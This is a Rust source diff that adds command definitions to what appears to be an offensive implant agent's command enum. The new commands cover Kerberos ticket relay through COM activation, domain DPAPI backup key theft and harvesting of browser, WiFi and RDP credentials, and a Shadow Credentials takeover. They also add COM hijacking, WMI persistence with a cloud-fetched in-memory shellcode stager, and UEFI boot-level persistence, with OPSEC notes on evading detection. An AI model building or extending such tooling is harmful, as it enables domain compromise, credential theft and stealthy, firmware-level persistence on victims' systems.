@@ -1093,6 +1093,435 @@ pub enum Command {
     /// (total, encrypted, decrypted_rw, decoded_rx) with no timing
     /// data, no counters, and no thresholds.
     PageTrackerStatusRedacted,
+
+    // ── Kerberos relay (Windows-only) ───────────────────────────────
+    /// Execute a Kerberos relay attack via COM cross-session activation.
+    /// Captures Kerberos service tickets without NTLM by triggering COM
+    /// activation against an attacker-controlled service, extracting the
+    /// AP-REQ from the RPC bind security trailer, and returning the
+    /// captured ticket data.
+    ///
+    /// Requires admin-level privileges (SeImpersonatePrivilege for COM
+    /// activation).  Windows-only, gated by `kerberos-relay` feature flag.
+    KerberosRelay {
+        /// Target hostname or IP for the COM activation.  When performing
+        /// local relay, use `127.0.0.1` or `localhost`.
+        target_host: String,
+        /// Service Principal Name (SPN) for Kerberos authentication.
+        /// Example: `cifs/target.corp.example.com`, `ldap/dc01.corp.example.com`.
+        target_spn: String,
+        /// Relay method to use for ticket capture.
+        #[serde(default)]
+        method: KerberosRelayMethod,
+        /// Name of the exploitable CLSID to use for COM activation.
+        /// Must match one of the entries in the agent's exploitable CLSID
+        /// database (e.g. "BITS", "ICertPassage", "TaskService",
+        /// "UpdateOrchestrator").
+        #[serde(default = "default_kerberos_clsid")]
+        clsid: String,
+        /// Local address to bind the relay listener on.
+        #[serde(default = "default_kerberos_bind_address")]
+        bind_address: String,
+        /// Local port for the relay listener.
+        #[serde(default = "default_kerberos_bind_port")]
+        bind_port: u16,
+        /// Timeout in seconds to wait for COM activation and ticket capture.
+        #[serde(default = "default_kerberos_timeout")]
+        timeout_secs: u64,
+    },
+
+    /// List available exploitable CLSIDs for Kerberos relay attacks.
+    /// Returns a JSON array of CLSID entries with names, GUIDs, and
+    /// descriptions.
+    KerberosRelayListClsids,
+
+    // ── DPAPI Backup Key (Windows-only) ─────────────────────────────────
+    /// Retrieve the domain DPAPI backup key from a Domain Controller using
+    /// the MS-BKRP (BackupKey Remote Protocol).  Any domain-authenticated
+    /// user can retrieve this key — Domain Admin privileges are NOT required.
+    /// The backup key is an RSA private key that can decrypt any DPAPI
+    /// master key in the domain.
+    ///
+    /// **OPSEC**: Does NOT touch LSASS memory.  Uses RPC over named pipe
+    /// to the DC's `\pipe\lsarpc`.
+    ///
+    /// Windows-only, gated by `dpapi-backup` feature flag.
+    DpapiBackupKeyRetrieve {
+        /// Optional DC hostname.  If not provided, the agent auto-discovers
+        /// the domain controller via DsGetDcNameW.
+        dc_hostname: Option<String>,
+    },
+
+    /// Harvest DPAPI-protected secrets from the target system using a
+    /// previously retrieved domain backup key.  Scans Credential Store,
+    /// Chrome/Edge cookies and saved passwords, WiFi profiles, and RDP
+    /// saved credentials.
+    ///
+    /// Requires the backup key to have been previously retrieved (via
+    /// `DpapiBackupKeyRetrieve`) and stored in the agent's session state.
+    ///
+    /// Windows-only, gated by `dpapi-backup` feature flag.
+    DpapiBackupKeyHarvest {
+        /// Domain backup key data (PVK blob, hex-encoded).
+        backup_key_hex: String,
+        /// Optional DC hostname for auto-discovery fallback.
+        #[serde(default)]
+        dc_hostname: Option<String>,
+    },
+
+    /// Decrypt a single DPAPI blob using the domain backup key.
+    /// Useful for targeted decryption of specific secrets.
+    ///
+    /// Windows-only, gated by `dpapi-backup` feature flag.
+    DpapiBackupKeyDecrypt {
+        /// DPAPI blob data (hex-encoded).
+        blob_hex: String,
+        /// Domain backup key data (PVK blob, hex-encoded).
+        backup_key_hex: String,
+    },
+
+    // ── Shadow Credentials (Windows-only) ──────────────────────────────
+    /// Execute the Shadow Credentials attack: add an attacker-controlled
+    /// certificate to a target's `msDS-KeyCredentialLink` attribute, then
+    /// authenticate as that principal via PKINIT Kerberos with no password
+    /// required and no password change logged.
+    ///
+    /// **Attack flow**:
+    /// 1. Resolve target DN from the target name
+    /// 2. Check write access to `msDS-KeyCredentialLink`
+    /// 3. Generate a self-signed X.509 certificate (RSA-2048)
+    /// 4. Build the `msDS-KeyCredentialLink` binary value
+    /// 5. Write it to the target object via LDAP
+    /// 6. Authenticate as the target via PKINIT
+    /// 7. Clean up (remove the credential link)
+    ///
+    /// **Prerequisites**: Windows Server 2016+ domain functional level,
+    /// write access to target's `msDS-KeyCredentialLink`.
+    ///
+    /// **OPSEC**: Does NOT change the target's password.  Does NOT require
+    /// Domain Admin privileges.  Credential link is cleaned up after use.
+    ///
+    /// Windows-only, gated by `shadow-credentials` feature flag.
+    ShadowCredentialsAttack {
+        /// Target name (sAMAccountName or distinguished name).
+        /// User example: "jdoe".  Computer example: "WORKSTATION01$"
+        target: String,
+    },
+
+    /// Check if the current user has write access to a target's
+    /// `msDS-KeyCredentialLink` attribute.  Returns true/false.
+    ///
+    /// Windows-only, gated by `shadow-credentials` feature flag.
+    ShadowCredentialsCheckAccess {
+        /// Target distinguished name.
+        target_dn: String,
+    },
+
+    /// Generate a self-signed X.509 certificate suitable for the
+    /// Shadow Credentials attack.  Returns the private key and
+    /// certificate in DER format (hex-encoded).
+    ///
+    /// Windows-only, gated by `shadow-credentials` feature flag.
+    ShadowCredentialsCertGen {
+        /// Subject name for the certificate (typically the target UPN).
+        subject: String,
+    },
+
+    // ── COM Object Hijacking (registry-free, activation context) ─────────
+
+    /// Generate an SxS manifest XML for registry-free COM CLSID redirection.
+    ///
+    /// The manifest redirects COM resolution for a given CLSID to a proxy DLL
+    /// without touching the Windows registry.  When loaded into an activation
+    /// context, COM object creation on the thread will resolve to the proxy.
+    ///
+    /// **OPSEC**: No registry writes — uses Side-by-Side (SxS) activation
+    /// contexts, which are thread-local and ephemeral.
+    ///
+    /// Windows-only, gated by `com-hijack` feature flag.
+    ComHijackManifest {
+        /// Target CLSID in `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format.
+        clsid: String,
+        /// Absolute or relative path to the proxy DLL.
+        proxy_dll_path: String,
+        /// Optional ProgID to include in the manifest.
+        prog_id: Option<String>,
+    },
+
+    /// Create and activate a COM hijack activation context from a manifest file.
+    ///
+    /// Loads the manifest from disk and activates it on the current thread.
+    /// After activation, COM resolution for the target CLSID is redirected
+    /// to the proxy DLL specified in the manifest.
+    ///
+    /// **OPSEC**: The manifest file must exist on disk temporarily.  For
+    /// disk-less operation, use `ComHijackActivateMemory`.
+    ///
+    /// Windows-only, gated by `com-hijack` feature flag.
+    ComHijackActivateFile {
+        /// Path to the manifest XML file on disk.
+        manifest_path: String,
+        /// Target CLSID being redirected (for logging).
+        clsid: String,
+    },
+
+    /// Create and activate a COM hijack activation context from in-memory manifest.
+    ///
+    /// Writes a temporary file, creates the activation context, then deletes
+    /// the file immediately.  The activation context persists in memory.
+    ///
+    /// **OPSEC**: No persistent disk writes.  Temporary file is deleted
+    /// immediately after context creation.
+    ///
+    /// Windows-only, gated by `com-hijack` feature flag.
+    ComHijackActivateMemory {
+        /// Complete SxS manifest XML content.
+        manifest_xml: String,
+        /// Target CLSID being redirected (for logging).
+        clsid: String,
+    },
+
+    /// Scan for hijackable COM objects.
+    ///
+    /// Returns a list of COM CLSIDs suitable for registry-free hijacking,
+    /// with metadata (ProgID, description, EDR visibility assessment).
+    ///
+    /// Windows-only, gated by `com-hijack` feature flag.
+    ComHijackScanTargets,
+
+    /// Generate a proxy DLL template for COM forwarding.
+    ///
+    /// Creates a minimal x86-64 PE DLL that exports `DllGetClassObject` and
+    /// `DllCanUnloadNow`.  Returns hex-encoded DLL bytes ready for writing
+    /// to disk or in-memory loading.
+    ///
+    /// Windows-only, gated by `com-hijack` feature flag.
+    ComHijackProxyDll {
+        /// Target CLSID (embedded as metadata in the DLL).
+        clsid: String,
+        /// Description of the original COM handler being proxied.
+        original_handler: String,
+    },
+
+    // ── WMI Permanent Subscriptions with Encrypted Cloud Payloads ─────────
+
+    /// Install a WMI permanent event subscription that triggers a cloud-hosted
+    /// payload.  Creates the WMI persistence triad (filter, consumer, binding).
+    /// The consumer contains only a stager command — no shellcode or encrypted
+    /// blobs.  The payload is uploaded to a cloud service (Azure Blob, AWS S3,
+    /// or GitHub Gist) and only materializes in memory when triggered.
+    ///
+    /// Windows-only, gated by `wmi-persistence` feature flag.
+    WmiInstallSubscription {
+        /// Configuration for the WMI subscription (JSON-serialized).
+        config_json: String,
+    },
+
+    /// Remove a WMI permanent event subscription by filter and consumer name.
+    /// Deletes the binding, consumer, and filter in the correct order.
+    ///
+    /// Windows-only, gated by `wmi-persistence` feature flag.
+    WmiRemoveSubscription {
+        /// Name of the __EventFilter to remove.
+        filter_name: String,
+        /// Name of the event consumer to remove.
+        consumer_name: String,
+    },
+
+    /// Scan for existing Orchestra WMI subscriptions.
+    /// Queries ROOT\subscription for filters and consumers matching our
+    /// naming pattern.
+    ///
+    /// Windows-only, gated by `wmi-persistence` feature flag.
+    WmiScanSubscriptions,
+
+    /// Encrypt and upload a shellcode payload to a cloud service.
+    /// Returns the upload URL and encryption metadata.  The encrypted blob
+    /// can then be referenced by a WMI subscription stager.
+    ///
+    /// Windows-only, gated by `wmi-persistence` feature flag.
+    WmiCloudUpload {
+        /// Shellcode payload to encrypt and upload.
+        payload: Vec<u8>,
+        /// Cloud storage configuration (JSON-serialized).
+        cloud_config_json: String,
+    },
+
+    /// Generate a PowerShell stager command for a given cloud payload URL
+    /// and decryption key.  The stager fetches, decrypts, and executes the
+    /// payload entirely in memory.
+    ///
+    /// Windows-only, gated by `wmi-persistence` feature flag.
+    WmiGenerateStager {
+        /// URL of the encrypted payload in cloud storage.
+        url: String,
+        /// Base decryption key (32 bytes, hex-encoded).
+        key_hex: String,
+    },
+
+    // ── UEFI Firmware-Level Persistence ───────────────────────────────────
+
+    /// Read a UEFI NVRAM variable.
+    ///
+    /// Cross-platform: uses `/sys/firmware/efi/efivars/` on Linux and
+    /// `GetFirmwareEnvironmentVariableW` on Windows.
+    UefiReadVariable {
+        /// Variable name (e.g., "BootOrder", "SecureBoot").
+        name: String,
+        /// EFI GUID in standard format (e.g., "8BE4DF61-93CA-11D2-AA0D-00E098032B8C").
+        guid: String,
+    },
+
+    /// Write a UEFI NVRAM variable.
+    ///
+    /// **DANGEROUS**: Writing incorrect NVRAM values can brick the firmware.
+    UefiWriteVariable {
+        /// Variable name.
+        name: String,
+        /// EFI GUID.
+        guid: String,
+        /// Variable data (base64-encoded).
+        data: String,
+        /// EFI variable attributes bitfield.
+        attributes: u32,
+    },
+
+    /// Enumerate all UEFI boot entries from NVRAM.
+    ///
+    /// Returns parsed `BootEntry` structures with descriptions, device paths,
+    /// and optional data.
+    UefiEnumerateBootEntries,
+
+    /// Modify an existing UEFI boot entry's device path.
+    ///
+    /// Creates a backup of the original entry before modification.
+    UefiModifyBootEntry {
+        /// Boot entry number (e.g., 0x0001).
+        entry_num: u16,
+        /// New EFI device path (e.g., `\EFI\Vendor\Driver.efi`).
+        new_path: String,
+    },
+
+    /// Mount (or locate) the EFI System Partition.
+    ///
+    /// Returns the mount point path.
+    UefiMountEsp,
+
+    /// Write an EFI driver binary to the ESP.
+    ///
+    /// The driver is placed in `\EFI\<vendor>\<driver_name>.efi`.
+    UefiWriteDriver {
+        /// Path to the mounted ESP.
+        esp_path: String,
+        /// Driver filename (without .efi extension).
+        driver_name: String,
+        /// Driver binary data (base64-encoded).
+        driver_data: String,
+        /// Vendor directory name (optional, uses blending heuristic if omitted).
+        vendor: Option<String>,
+    },
+
+    /// Build a minimal EFI application PE/COFF stub with embedded payload.
+    ///
+    /// Generates a valid PE32+ binary with .text, .rdata, and .reloc sections.
+    UefiBuildStub {
+        /// Payload data to embed in the .rdata section (base64-encoded).
+        payload_data: String,
+        /// Path to a second-stage EFI driver on the ESP.
+        second_stage_path: String,
+        /// Offset within payload to use as entry point.
+        entry_point_offset: u32,
+        /// Whether to chain-load the original bootloader after the payload.
+        chain_to_original: bool,
+        /// Path to the original bootloader (for chain-loading).
+        original_bootloader_path: String,
+    },
+
+    /// Install a runtime DXE driver via NVRAM driver load list or capsule.
+    UefiInstallRuntimeDriver {
+        /// Driver binary data (base64-encoded).
+        driver_data: String,
+        /// Driver filename.
+        driver_name: String,
+        /// Path to the mounted ESP.
+        esp_path: String,
+        /// Use capsule delivery instead of driver load list.
+        use_capsule: bool,
+    },
+
+    /// Check firmware capsule update support.
+    ///
+    /// Reads OsIndicationsSupported to determine available capsule methods.
+    UefiCheckCapsuleSupport,
+
+    /// Scan for existing UEFI persistence artifacts.
+    ///
+    /// Checks boot entries, ESP files, NVRAM variables, and bootloader configs.
+    UefiDetectPersistence {
+        /// Path to the mounted ESP.
+        esp_path: String,
+    },
+
+    /// Remove a detected UEFI persistence artifact.
+    ///
+    /// Creates a backup before removal.
+    UefiRemovePersistence {
+        /// Artifact type.
+        artifact_type: String,
+        /// Human-readable description.
+        description: String,
+        /// Location/path of the artifact.
+        path: String,
+        /// Risk level.
+        risk_level: String,
+        /// Whether the artifact can be safely removed.
+        removable: bool,
+    },
+}
+
+/// Kerberos relay method selector.
+///
+/// Controls how the agent captures and forwards Kerberos tickets during
+/// the relay attack.  Each method has different OPSEC tradeoffs:
+///
+/// - **ComActivation**: Trigger COM cross-session activation with a custom
+///   COSERVERINFO to force Kerberos authentication.  Most reliable for
+///   capturing tickets from local SERVICE accounts.
+/// - **LdapRelay**: Relay the captured Kerberos ticket to an LDAP server
+///   for enumeration or modification (e.g. DsWriteAccountSpn).
+/// - **RpcBind**: Capture the ticket from a raw RPC bind request without
+///   COM activation infrastructure.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum KerberosRelayMethod {
+    /// COM cross-session activation (CoCreateInstanceEx).
+    ComActivation,
+    /// Relay captured ticket to LDAP for AD operations.
+    LdapRelay,
+    /// Raw RPC bind ticket capture.
+    RpcBind,
+}
+
+impl Default for KerberosRelayMethod {
+    fn default() -> Self {
+        Self::ComActivation
+    }
+}
+
+fn default_kerberos_clsid() -> String {
+    "BITS".to_string()
+}
+
+fn default_kerberos_bind_address() -> String {
+    "127.0.0.1".to_string()
+}
+
+fn default_kerberos_bind_port() -> u16 {
+    0
+}
+
+fn default_kerberos_timeout() -> u64 {
+    30
 }
 
 /// AMSI bypass strategy selector.
